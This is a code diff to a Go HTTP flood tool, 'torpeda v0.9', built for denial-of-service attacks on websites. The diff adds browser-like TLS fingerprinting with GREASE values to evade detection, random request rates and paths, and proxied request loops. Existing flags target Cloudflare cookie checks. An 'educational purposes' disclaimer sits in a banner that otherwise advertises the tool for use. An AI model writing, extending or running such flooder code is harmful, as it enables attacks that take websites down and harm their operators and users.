@@ -46,6 +46,36 @@ var (
 	}
 )
 
+var supportedVersions = []uint16{
+	0xfafa,
+	tls.VersionTLS13,
+	tls.VersionTLS12,
+}
+var cipherSuites = []uint16{
+	0xCACA,
+	tls.TLS_AES_128_GCM_SHA256,
+	tls.TLS_AES_256_GCM_SHA384,
+	tls.TLS_CHACHA20_POLY1305_SHA256,
+	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
+}
+
+var supportedGroups = []tls.CurveID{
+	tls.X25519,
+	tls.CurveP256,
+	tls.CurveP384,
+}
+
 var (
 	reqmethod string
 	target    string
@@ -163,7 +193,7 @@ func main() {
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 		fmt.Print("\033[H\033[2J")
-		fmt.Println(`	[flooder - golang] torpeda v0.9 // Updated: 17.11.2024 // Made with love :D
+		fmt.Println(`	[flooder - golang] torpeda v0.9 // Updated: 22.11.2024 // Made with love :D
 	Developers to method: @rapidreset aka mitigations / helped @benshii
 	WARNING: The method was done for educational purposes, all responsibility is on you!
 	Annoucement: @devtorpeda / @rapidreset
@@ -186,6 +216,8 @@ func main() {
 	--cf - For sites who has protection based on check cf_clearence cookies
 	--http1 - For sites who have only http/1.1 
 	--multipath "/login@/register@" - max 5 paths like "/page1@/page2@/page3@/page4@/page5"
+	--randrate - beta test
+	--randpath - beta test
 	--jar - beta test
 	--delay - beta test
 	 `)
@@ -272,6 +304,11 @@ func main() {
 		case "--jar":
 			useJar = true
 		}
+	}
+
+	if randRate {
+		rand.Seed(time.Now().UnixNano())
+		rps = float64(rand.Intn(60) + 1)
 	}
 
 	checkLicense()
@@ -914,24 +951,21 @@ func start(proxy string) {
 	}
 	
     tlsConfig := &tls.Config{
-        ServerName:               parsedURL.Host,
-        ClientSessionCache:       tls.NewLRUClientSessionCache(128),
-        PreferServerCipherSuites: true,
-        InsecureSkipVerify:       true,
+		ServerName: 			  parsedURL.Host,
+		MinVersion:               supportedVersions[len(supportedVersions)-1],
+		MaxVersion:               supportedVersions[0],
+		CurvePreferences:         supportedGroups,
+		CipherSuites:             cipherSuites,
+		ClientSessionCache:       tls.NewLRUClientSessionCache(0),
+		PreferServerCipherSuites: true,
+		InsecureSkipVerify:       false,
     }
 
 	if useHTTP2 {
-		tlsConfig.NextProtos = []string{"h2"}
+		tlsConfig.NextProtos = []string{"h2", "http/1.1"}
 	} else {
 		tlsConfig.NextProtos = []string{"http/1.1"}
 	}
-
-	conn, err := tls.Dial("tcp", parsedURL.Host+":443", tlsConfig)
-	if err != nil {
-		// fmt.Println("Error creating TLS connection:", err)
-		return
-	}
-	defer conn.Close()
 
 	var transport *http.Transport
 	if proxyType == "socks5" || proxyType == "socks4" {
@@ -943,7 +977,7 @@ func start(proxy string) {
 	} else {
 		proxyURL, err := url.Parse(proxy)
 		if err != nil {
-			fmt.Println("Error parsing proxy URL:", err)
+			// fmt.Println("Error parsing proxy URL:", err)
 			return
 		}
 		transport = &http.Transport{
@@ -977,7 +1011,7 @@ func start(proxy string) {
 	}
 
 	client := &http.Client{
-		Timeout:   time.Second * 10,
+		Timeout:   5 * time.Second,
 		Transport: transport,
 	}
 
@@ -1033,38 +1067,32 @@ func start(proxy string) {
 		}
 	}
 
-
 	if test {
 		body, _ := io.ReadAll(resp.Body)
 		fmt.Printf(": %s\n", string(body))
 	}
 	
 	atomic.AddInt32(&connections, 1)
+	executeRequestsWithRateLimit(client, req, rps)
+}
+
+func executeRequestsWithRateLimit(client *http.Client, req *http.Request, rps float64) {
+	rateLimit := time.NewTicker(time.Second / time.Duration(rps))
+	defer rateLimit.Stop()
 
 	for {
-        // Если randRate активирован, рандомизируем rps
-        currentRPS := rps
-        if randRate {
-            rand.Seed(time.Now().UnixNano())
-            currentRPS = float64(rand.Intn(60) + 1) // Генерация rps от 1 до 60
-        }
-
-        rateLimit := time.NewTicker(time.Second / time.Duration(currentRPS))
-        defer rateLimit.Stop()
-
-        select {
-        case <-rateLimit.C:
-            delayrandom()
-            resp, err := client.Do(req)
-            if err != nil {
-                updateErrorCounters(err)
-                continue
-            }
-            resp.Body.Close()
-            updateStatusMap(resp.StatusCode)
+		select {
+		case <-rateLimit.C:
+			delayrandom()
+			resp, err := client.Do(req)
+			if err != nil {
+				updateErrorCounters(err)
+				continue
+			}
+			resp.Body.Close()
+			updateStatusMap(resp.StatusCode)
 		}
 	}
-	time.Sleep(time.Second)
 }
 
 func updateErrorCounters(err error) {
